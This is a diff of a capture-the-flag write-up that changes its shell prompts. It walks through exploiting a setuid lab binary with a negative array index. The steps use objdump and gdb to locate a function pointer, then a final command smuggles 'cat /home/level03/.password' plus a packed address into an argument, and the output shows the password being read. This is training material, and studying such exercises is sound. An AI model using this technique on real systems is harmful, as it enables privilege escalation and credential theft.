@@ -6,23 +6,23 @@ and a vulnerable setuid program with its source code is in `/levels/level03`.
 
 Let's first play with the program to see what it does:
 ```
-level02@box:~$ /levels/level03/level03
+$ /levels/level03/level03
 Usage: ./level03 INDEX STRING
 Possible indices:
 [0] to_upper    [1] to_lower
 [2] capitalize  [3] length
-level02@box:~$ /levels/level03/level03 0 hello
+$ /levels/level03/level03 0 hello
 Uppercased string: HELLO
-level02@box:~$ /levels/level03/level03 2 hello
+$ /levels/level03/level03 2 hello
 Capitalized string: Hello
-level02@box:~$ /levels/level03/level03 3 hello
+$ /levels/level03/level03 3 hello
 Length of string 'hello': 5
 ```
 
 It takes a string and runs some function on it depending on the index parameter.
 Let's try to misuse this, for example with a negative index:
 ```
-level02@box:~$ /levels/level03/level03 -1 x
+$ /levels/level03/level03 -1 x
 Segmentation fault
 ```
 
@@ -112,8 +112,8 @@ Since we can control the parameter,
 we can make the program run whatever we want.
 We can find the address of `run` using `objdump`:
 ```
-level02@box:~$ /levels/level03/level03 -1 x
-level02@box:~$ objdump -d /levels/level03/level03 | grep run
+$ /levels/level03/level03 -1 x
+$ objdump -d /levels/level03/level03 | grep run
 0804879b <run>:
 080487ae <truncate_and_call>:
  8048806:   74 05                   je     804880d <truncate_and_call+0x5f>
@@ -124,7 +124,7 @@ To find the right negative index,
 we need to figure out the distance between `fns` and `buf` in the memory.
 We can do that using `gdb`:
 ```
-level02@box:~$ gdb /levels/level03/level03
+$ gdb /levels/level03/level03
 (gdb) run -1 AAAAAAAA
 Starting program: /levels/level03/level03 -1 AAAAAAAA
 
@@ -181,7 +181,7 @@ The difference between `fns` and the jump address is `0xbfae3dd8 - 0xbfae3d88 = 
 and since the size of an element in `fns` is 4 bytes,
 the index we're looking for is `-80 / 4 = -20`:
 ```
-level02@box:~$ /levels/level03/level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
+$ /levels/level03/level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
 eingaima
 cat: can't open '��': No such file or directory
 ```
